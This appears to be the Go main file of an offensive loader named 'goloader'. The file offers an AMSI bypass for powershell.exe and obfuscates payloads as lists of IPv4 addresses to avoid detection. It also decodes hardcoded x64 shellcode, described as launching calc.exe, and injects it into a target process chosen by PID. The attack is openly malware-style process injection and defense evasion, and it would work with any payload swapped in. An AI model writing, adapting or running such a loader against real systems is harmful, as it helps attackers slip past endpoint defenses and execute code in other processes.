package main
import (
	"fmt"
	"flag"
	"strings"
	"strconv"
	"encoding/hex"

	// Own modules
	"goloader/internal/helpers"
	"goloader/internal/obfuscator"
	"goloader/internal/syscall"
	"goloader/internal/evasion"

	"golang.org/x/sys/windows"
)

func main() {
	// Defining available flags
	payloadPtr := flag.String("payload", "", "payload which should be executed")
	payloadFilePtr := flag.String("payloadFile", "", "Path to file with payload")
	obfuscateToIPv4Ptr := flag.Bool("toIPv4", false, "Obfuscate payload to IPv4 list")
	restoreFromIPv4Ptr := flag.Bool("fromIPv4", false, "Restore from payload")
	bypassAmsiPtr := flag.Bool("byAMSI", false, "Performs the AMSI bypass")

	// Parse all falgs
	flag.Parse()

	// Perform AMSI bypass
	if  *bypassAmsiPtr {
		fmt.Println("[i] Try to bypass AMSI ...")
		amsi.AMSIBypass("powershell.exe")
	}

	// If no payload given, we have nothing to do
	if len(*payloadPtr) == 0 && len(*payloadFilePtr) == 0 {
		fmt.Println("[X] No payload given... nothing to do...")
		return
	}
	payload := *payloadPtr

	// Obfuscate payload to IPv4 comma separated list
	// Prints to stdout
	if *obfuscateToIPv4Ptr {
		chunk := obfuscator.ObfuscateToIPv4(payload)
		fmt.Println(strings.Join(chunk, ","))
		return
	}

	if len(*payloadFilePtr) != 0 {
		payload = helpers.GetContentFromFileWithChecks(payloadFilePtr)
		if *restoreFromIPv4Ptr && len(payload) > 0{
			payload = obfuscator.DeobfuscateFromIPv4(
				strings.Split(payload, ","))
			}
		}

		// Do the system magic
		//syscall.ExecuteSystemCallInNewProcess(payload)
	
		// Testing ....	
		//shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP slide
		// Shellcode executes calc.exe
		shellcode, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500")
		pid, _ := strconv.Atoi(payload)
		processHandle := syscall.OpenProcessByProcessID(pid)
		if processHandle != windows.InvalidHandle {
			syscall.ExecuteShellcodeOnProcess(processHandle, shellcode);
		}
	}
